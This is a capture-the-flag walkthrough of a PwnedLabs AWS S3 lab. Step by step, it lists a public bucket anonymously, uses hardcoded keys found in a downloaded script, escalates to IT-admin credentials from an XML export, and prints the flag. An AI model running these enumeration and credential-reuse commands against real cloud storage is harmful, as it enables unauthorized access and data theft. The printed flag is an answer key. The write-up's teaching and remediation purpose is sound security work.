# PwnedLabs Walkthrough: AWS S3 Enumeration

## Overview

This lab demonstrates how a publicly accessible Amazon S3 bucket exposed sensitive files, leading to credential disclosure, privilege escalation, and retrieval of the flag.

## Attack Path

1. Enumerate public S3 bucket anonymously
2. Discover accessible directories
3. Download exposed migration project archive
4. Extract hardcoded AWS credentials
5. Authenticate as a low-privileged IAM user
6. Access additional migration files
7. Discover higher-privileged AWS credentials
8. Authenticate as IT Admin
9. Retrieve the protected flag

## Initial Enumeration

```bash
aws s3 ls s3://dev.huge-logistics.com --no-sign-request
```

Output:

```text
PRE admin/
PRE migration-files/
PRE shared/
PRE static/
index.html
```

The bucket allowed anonymous listing.

## Exploring Directories

### admin/

```bash
aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request
```

Result:

```text
Access Denied
```

### migration-files/

```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
```

Result:

```text
Access Denied
```

### shared/

```bash
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
```

Result:

```text
hl_migration_project.zip
```

## Downloading Public Files

```bash
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
```

Extract:

```bash
unzip hl_migration_project.zip
```

Contents:

```text
migrate_secrets.ps1
```

## Source Code Review

The PowerShell script contained hardcoded AWS credentials used for a Secrets Manager migration process.

After configuring the credentials:

```bash
aws configure --profile pwnedlabs
aws sts get-caller-identity --profile pwnedlabs
```

Identity:

```text
arn:aws:iam::794929857501:user/pam-test
```

## Enumerating as pam-test

```bash
aws s3 ls s3://dev.huge-logistics.com/admin/ --profile pwnedlabs
```

Output:

```text
flag.txt
website_transactions_export.csv
```

Attempting to download the flag failed:

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile pwnedlabs
```

```text
403 Forbidden
```

The user could list objects but not retrieve them.

## Discovering More Data

```bash
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --profile pwnedlabs
```

Interesting file:

```text
test-export.xml
```

Download:

```bash
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml . --profile pwnedlabs
```

The XML file contained multiple credential records, including AWS IT Admin credentials.

## Privilege Escalation

Configure the newly discovered credentials:

```bash
aws configure --profile admin
```

Verify access:

```bash
aws sts get-caller-identity --profile admin
```

Output:

```text
arn:aws:iam::794929857501:user/it-admin
```

## Retrieving the Flag

```bash
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt . --profile admin
```

```bash
cat flag.txt
```

Flag:

```text
a49f18145568e4d001414ef1415086b8
```

## Findings

### Anonymous S3 Enumeration
The bucket allowed unauthenticated users to enumerate content.

### Sensitive Files in Public Storage
Migration files were exposed through a publicly accessible location.

### Hardcoded AWS Credentials
Credentials were embedded directly within source code.

### Plaintext Secret Storage
The XML export contained sensitive credentials and administrative access keys.

### Privilege Escalation
A low-privileged IAM user could access files containing higher-privileged credentials.

## Conclusion

A single S3 misconfiguration led to source code disclosure, credential exposure, privilege escalation, and ultimately full access to restricted resources. This lab highlights the importance of securing cloud storage, removing hardcoded secrets, and enforcing least-privilege access controls.
